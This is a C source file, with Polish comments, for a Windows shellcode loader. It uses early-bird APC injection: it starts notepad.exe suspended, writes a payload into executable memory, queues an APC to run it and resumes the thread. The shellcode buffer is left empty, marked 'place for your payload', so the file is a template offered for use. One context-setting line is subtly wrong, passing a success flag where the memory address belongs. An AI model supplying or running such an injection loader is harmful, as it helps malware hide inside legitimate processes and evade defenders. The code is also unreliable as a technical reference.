/*CreateProcessA, VirtualAllocEx, WriteProcessMemory, QueueUserAPC, ResumeThread*/
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>




char shellcode[] = {""};// place for your payload
    SIZE_T shellcodesize = sizeof(shellcode);

int main(void){



//utworzenie nowego procesu
    PROCESS_INFORMATION pi;
    STARTUPINFO si = {sizeof(si)};

    BOOL hProcess = CreateProcessA(
        NULL, 
        "C:\\Windows\\System32\\notepad.exe", 
        NULL,  
        NULL, 
        FALSE, 
        CREATE_SUSPENDED, 
        NULL,
        NULL,
        &si, 
        &pi 
    );
    if(hProcess == 0){
        printf("[-] nie udalo sie utworzyc nowego procesu, error: [%d]\n", GetLastError());
        return 1;
    }
    printf("[+] pomyslnie utworzono proces: [%d]\n", pi.dwProcessId);


//alokacja pamieci w procesie
    printf("rozmiar payloadu: [%d]\n", shellcodesize);// sprawdzam czy dobrze odczytuje payload
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcodesize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//potrzbny pi.hProcess nie hProcess
    if (!remoteMem){
        printf("[-] alokacja pamieci zakonczona niepowodzeniem, error: [%d]\n", GetLastError());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    printf("[+] pomyslnie alokowano pamiec do: [%X]\n", remoteMem);


//zapisanie payloadu do pamieci procesu
    SIZE_T written;
    BOOL writeMem = WriteProcessMemory(pi.hProcess, remoteMem, shellcode, shellcodesize, &written);
    if (writeMem == 0){
        printf("[-] nie udalo sie zapisac danych do procesu, error: [%d]\n", GetLastError());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    printf("[+] pomyslnie zapisano dane do procesu [%d]\n", written);

// Step 5: Set the entry point of the process to the start of the shellcode
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[-] nie mozna pobrac kontekstu dla watku, error: [%d]\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    
    ctx.Rcx = (DWORD64)writeMem;
    
    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[-] nie mozna ustawic kontekstu dla wątku, error: [%d]\n", GetLastError());
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] pomyslnie ustawiono punkt wejscia!\n");

    PTHREAD_START_ROUTINE* apcRoutine = remoteMem;

    
//dodanie asynchronicznego wywolania procedry(wykonanie kodu w juz istniejacym watku) https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls
    DWORD apcque = QueueUserAPC((PAPCFUNC)apcRoutine, pi.hThread, 0);

//wznawiamie wątku z zapisanym payloadem
    ResumeThread(pi.hThread);

    
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
